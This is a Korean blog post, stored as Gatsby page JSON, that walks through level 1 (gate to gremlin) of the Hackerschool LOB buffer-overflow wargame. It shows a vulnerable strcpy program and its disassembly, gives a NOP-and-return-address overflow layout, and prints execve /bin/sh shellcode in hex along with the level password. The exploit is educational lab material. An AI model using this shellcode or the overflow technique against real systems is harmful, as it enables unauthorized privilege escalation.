{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221011/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>이거이거 드디어 본방이라고 할 수 있는 FTZ LOB의 시작이다!</p>\n<p>사실 이것 제외하고도 본격적인 CTF 실습을 위해 Hack The Box를 병행하고 있지만, 이건 저작권 관련해서 자세하게 공략글을 쓸 수는 없다. 그래도 공부하는 기법들(대부분 웹 해킹)에 대해서는 꾸준히 업로드 해보려고 한다.</p>\n<h3>1. Level 1 : Gate -> Gremlin</h3>\n<p>LOB부터는 딱히 힌트는 제공되지 않는다. 그래도 소스코드야 볼 수 있으니 이미 FTZ에서 익숙해진 우리라면 충분히 해결할 수 있을 것이다.</p>\n<p>그런 의미에서 소스코드를 살펴보면, 딱히 어렵지 않다!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">int main(int argc, char *argv[])\r\n{\r\n    char buffer[256];\r\n    if(argc &lt; 2){\r\n        printf(\"argv error\\n\");\r\n        exit(0);\r\n    }\r\n    strcpy(buffer, argv[1]);\r\n    printf(\"%s\\n\", buffer);\r\n}</code></pre></div>\n<p>첫 문제라 그런가, 딱히 FTZ과의 차이를 모르겠다. 아주 간단하게 오버플로우를 할 수 있는 구조이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x8048430 &lt;main>:       push   %ebp\r\n0x8048431 &lt;main+1>:     mov    %ebp,%esp\r\n0x8048433 &lt;main+3>:     sub    %esp,0x100\r\n0x8048439 &lt;main+9>:     cmp    DWORD PTR [%ebp+8],1\r\n0x804843d &lt;main+13>:    jg     0x8048456 &lt;main+38>\r\n0x804843f &lt;main+15>:    push   0x80484e0\r\n0x8048444 &lt;main+20>:    call   0x8048350 &lt;printf>\r\n0x8048449 &lt;main+25>:    add    %esp,4\r\n0x804844c &lt;main+28>:    push   0\r\n0x804844e &lt;main+30>:    call   0x8048360 &lt;exit>\r\n0x8048453 &lt;main+35>:    add    %esp,4\r\n0x8048456 &lt;main+38>:    mov    %eax,DWORD PTR [%ebp+12]\r\n0x8048459 &lt;main+41>:    add    %eax,4\r\n0x804845c &lt;main+44>:    mov    %edx,DWORD PTR [%eax]\r\n0x804845e &lt;main+46>:    push   %edx\r\n0x804845f &lt;main+47>:    lea    %eax,[%ebp-256]\r\n0x8048465 &lt;main+53>:    push   %eax\r\n0x8048466 &lt;main+54>:    call   0x8048370 &lt;strcpy>\r\n0x804846b &lt;main+59>:    add    %esp,8\r\n0x804846e &lt;main+62>:    lea    %eax,[%ebp-256]\r\n0x8048474 &lt;main+68>:    push   %eax\r\n0x8048475 &lt;main+69>:    push   0x80484ec</code></pre></div>\n<p>ebp-256시점에 배열이 다 채워지고 딱히 더미 데이터는 없는 것으로 보인다. 따라서 SFP 4바이트만큼을 더해주고 EGG를 등록한 후 EGG의 주소를 확인하여 입력해주면 된다.</p>\n<p>혹시 EGG가 뭔지 모른다면, 내 블로그의 다음 글을 확인해보자!</p>\n<p>EGG의 주소: 0xbffffed4</p>\n<p>따라서 쉘 코드:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">256 + sfp4 + ret4 => NOP * 260 + ret4(shellcode)\r\n\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x31\\xc0\\xb0\\x46\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\\x80</code></pre></div>\n<p>비밀번호 : hello bof world</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"FTZ LOB LEVEL 1","summary":"","date":"2022.10.11.","before":"2022.10.10.","after":"2022.10.12.","categories":["KOR","pwn"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221011/"}},"staticQueryHashes":["1523927062"],"slicesMap":{}}